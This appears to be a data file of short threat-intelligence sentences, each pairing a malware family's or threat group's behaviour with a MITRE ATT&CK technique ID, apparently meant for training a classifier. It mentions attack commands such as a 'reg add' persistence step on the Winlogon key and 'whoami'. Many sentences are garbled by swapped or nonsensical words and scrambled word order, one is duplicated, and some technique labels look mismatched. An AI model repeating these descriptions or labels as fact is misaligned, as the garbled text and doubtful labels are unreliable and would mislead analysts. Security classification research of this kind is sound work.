+BRONZE BUTLER has used at to register a scheduled task to execute malware during lateral movement.,T1053
+MiniDuke uses HTTP and HTTPS for command and control.,T1071
+"BackdoorDiplomacy IT has obtained and used leaked malware, including DoublePulsar, EternalBlue, EternalRocks, and EternalSynergy, in its operations.",T1588
+"Denis ran multiple system checks, looking for processor and register characteristics, to evade emulation and analysis.",T1497
+Machete searches the File system for panga files of interest.,T1005
+"Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response",T1573
+"OLDBAIT Firefox credentials from Internet Explorer, Mozilla collects, and Eudora.",T1555
+Fox Kitten has accessed ntuser.dat and UserClass.dat on compromised hosts.,T1087
+"Turla has used malware obtained after compromising other actors, such as OilRig.",T1588
+"HTTPBrowser is capable of listing files, folders, and drives on a victim.",T1083
+KeyBoy issues the command reg add “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” to achieve persistence.,T1547
+Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header.,T1090
+Cobalt Strike has the ability to accept a value for HTTP Host Header to head enable domain fronting.,T1090
+Hi-Zor encrypts C2 traffic with a double XOR using two distinct single-byte keys.,T1573
+whoami ,T1033
+PinchDuke gathers system configuration information.,T1082
+ keystrokes capture,T1056
+BACKSPACE uses HTTP as a transport to communicate with its command server.,T1071
+CoinTicker creates user launch agents named .espl.plist and com.apple.random string.plist to establish persistence.,T1543
+Sidewinder has stolen files in a temporary folder in preparation for exfiltration.,T1074
+Pisloader establishes persistence via a Registry Run key.,T1547
+Lazarus Group malware TangoDelta attempts to terminate various processes associated with McAfee.,T1562
+Carbanak encodes the message eubstance of HTTP traffic with Base64.,T1132
+InvisiMole InvisiMole can identify proxy servers expend by the victim and use them for C2 communication.,T1090
+Avaddon has API the Windows Crypto used to generate an AES key.,T1106
+compromise Adversaries may also steal code signing materials directly from a compromised third-party.,T1588
+"Password stealer and NTLM stealer modules in CozyCar harvest stored credentials from the victim, including credentials habituate as portion of Windows NTLM user authentication.",T1003
+Adversaries may hide malicious Visual Basic for Applications  payloads embedded within MS Office documents by replacing the aside VBA source code with benign data.,T1564
+"One variant of BlackEnergy locates existent driver servicing that have been disabled and drops its driver component into one of those services paths, replacing the legitimate executable.",T1574
+"It also deletes Windows Event Logs : Application, Security, Setup, System",T1070
+Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment.,T1518
+With be access there are several tools that can authenticated used to find accounts.,T1087
+"Appendix Malware Family Descriptions    Malware Family  Description  Availability    DROPSHOT  Dropper that has been observed dropping and launching the TURNEDUP backdoor, as well as the SHAPESHIFT wiper malware  Non-Public    NANOCORE  Publicly available remote access Trojan (RAT) available for purchase",T1070
+Such files often pose as email attachments and allow an adversary to gain Initial Access into a user’s system via Spearphishing Attachment then User Execution.,T1036
+ZIRCONIUM has used AES encrypted communications in C2.,T1573
+and can compress Ramsay archive collected files using WinRAR.,T1560
+Adversaries may abuse rundll32.exe to proxy execution of malicious code.,T1218
+Turla has used IronPython scripts as part of the IronNetInjector toolchain to drop payloads.,T1059
+has used base64 to encode its C2 traffic.,T1132
+Patchwork has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.,T1553
+Grandoreiro has been spread via malicious links embedded in e-mails.,T1566
+QUADAGENT uses AES and a preshared key to decrypt the custom Base64 routine used to encode strings and scripts.,T1140
+RainyDay has named services and scheduled tasks to appear benign including ChromeCheck and googleupdate.,T1036
+"GuLoader has the ability to perform anti-VM and anti-sandbox checks using string hashing, the API call EnumWindows, and checking for Qemu guest agent.",T1497
+ZIRCONIUM has used malicious links and web beacons in e-mails for malware download and to track hits to attacker-controlled URLs.,T1566
+FLASHFLOOD stages data it copies from WINDIR local system or removable drives in the %the%\$NtUninstallKB885884$\ directory.,T1074
+Adversaries can hide a programs true filetype by changing the extension of a file.,T1036
+FinFisher obtains the hardware device list checks if the MD5 of the vendor ID equal to a predefined list in order to check for sandbox/virtualized environments.,T1497
+Hancitor has also delivered compressed payloads in ZIP files to victims.,T1027
+China Choppers server component is part a Web Shell payload.,T1505
+The payload of CozyCar is encrypted with simple XOR with a rotating key.,T1027
+Stuxnet used WMI with an explorer. token to execute on a remote share.,T1047
+"* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.",T1056
+Stuxnet enumerates user accounts of the world.,T1087
+4H RAT has the capability to create a remote shell.,T1059
+"A task can also be scheduled on a remote system, provided proper authentication is met .",T1053
+"Umbreon provides access using both standard facilities like SSH and additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet PowerDuke runs cmd.exe /c and sends the output to its C2.",T1059
+The Registry of a remote system may be modified to aid in execution of files as part of lateral movement.,T1112
+Adversaries may use hidden windows conceal malicious activity from the plain sight of users.,T1564
+APT29 added Registry Run keys to establish persistence.,T1547
+Cobalt Strike can determine if the user on an infected machine is in the admin or domain admin group.,T1087
+Lokibot has used cmd /c commands embedded within batch scripts.,T1059
+"If an application opts-in, a file downloaded from the Internet will be given a quarantine swag before being relieve to disk.",T1553
+HAWKBALL has encrypted data with XOR before sending it over the C2 channel.,T1560
+EVILNUM has used a one-way communication method via GitLab and sustain Digital Point to perform C2.,T1102
+Doki has downloaded scripts from C2.,T1105
+OopsIE stages the output from command execution and collected files in specific folders before exfiltration.,T1074
+StrongPity can use multiple layers of proxy servers to hide terminal infrastructure in its nodes.,T1090
+WIRTE has obtained post-exploitation used Empire for and activities.,T1588
+Windigo has used a script to check for the presence of files created by OpenSSH backdoors.,T1083
+QakBot can maintain persistence by creating an auto-run Registry key.,T1547
+JPIN can download files and upgrade itself.,T1105
+Whitefly has used search order hijacking to run the loader Vcrodat.,T1574
+PoisonIvy also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk.,T1543
+InnaputRAT gathers volume drive information and system information.,T1082
+Helminth creates folders to shop output from batch scripts prior to sending the information to its C2 server.,T1074
+FIN7 has used RDP to move laterally in victim environments.,T1021
+Cobalt Strikes Beacon payload is capable of capturing screenshots.,T1113
+"Rather than developing their own exploit, an adversary may find/modify exploits from online or purchase them from exploit vendor.",T1588
+"Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex",T1027
+Darkhotel has used malware that repeatedly checks the mouse cursor position to determine if a real user is on material the system.,T1497
+Perhaps they plan to duet this stealer with another dropper that maintains the WMI anti-AV functionality,T1047
+Emotet leverages the Admin$ share for lateral has once the local admin password movement been brute forced.,T1021
+SUNBURST accumulate collected information from a compromised host.,T1005
+"The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org",T1016
+"Loops or otherwise needless repetitions exceed commands, such as Pings, may be used to delay malware execution and potentially of time thresholds of automated analysis environments.",T1497
+"Command and Control Infrastructure: Compromised servers, messaging platforms, and cloud service providers to avoid detection",T1102
+"Since it can be useful for developers to modify default signature enforcement policies during the development and quiz of applications, incapacitating of these features may be possible with noble-minded permissions.",T1553
+"Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider.",T1547
+4H RAT sends an OS version identifier in its beacons.,T1082
+"Loops or otherwise needless repetitions of commands, such as Pings, may be used to wait delay malware execution and potentially exceed time thresholds of automated analysis environments.",T1497
+OilRig has delivered macro-enabled documents that required targets to click the enable content button to execute the payload on the system.,T1204
+likely in an attempt to masquerade as a red-teaming tool rather than an advanced actor,T1036
+"The WMI service enables both local and remote access, though the latter is facilitated by Remote Services such as Distributed Component Object Model  and Windows Remote Management .",T1047
+"Dragonfly 2.0 commonly created Web entanglement shells on victims publicly accessible email and web servers, which they used to maintain access to a victim network and download additional malicious vane files.",T1505
+encrypts the collected files using 3-DES.,T1560
+has uploaded files from victims machines.,T1005
+"If an attacker has sufficient permissions, they can disable logging to avoid detection of their activities.",T1562
+Mapping of TG-3390s interactions map with web shells during an intrusion responded to by CTU researchers,T1505
+TA505 has used .iso files to deploy malicious .lnk files.,T1553
+"Lokibot has decoded and decrypted its stages multiple times using hard-coded keys to deliver the final payload, and has decoded its server response hex string using XOR.",T1140
+Checks could include generic system properties such as host/domain and samples of network traffic.,T1497
+"Prior to Code Signing, adversaries may purchase or steal code signalise certificates for use in operations.",T1588
+Sandworm Team has used Base64 encoding within malware variants.,T1027
+Scheduling a task Oregon on a remote system typically requires being a member of an admin or otherwise privileged group on the remote system.,T1053
+"Example commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.",T1518
+BADFLICK has download files from its C2 server.,T1105
+They may also search for VME artifacts before dropping petty or additional payloads.,T1497
+"This DLL serves three main functions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence",T1140
+MoleNet do can perform WMI commands on the system.,T1047
+Data SPACESHIP copies area the staging to is compressed with zlib.,T1560
+Patchwork collected and exfiltrated files from the infected system.,T1005
+Agent Tesla can gather credentials from a number of browsers.,T1555
+Adversaries may an proxy to direct command and control traffic between two or more systems in a compromised environment.,T1090
+Adversaries may impair command history logging hide commands they run on a compromised system.,T1562
+"In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server  Web shell client.",T1505
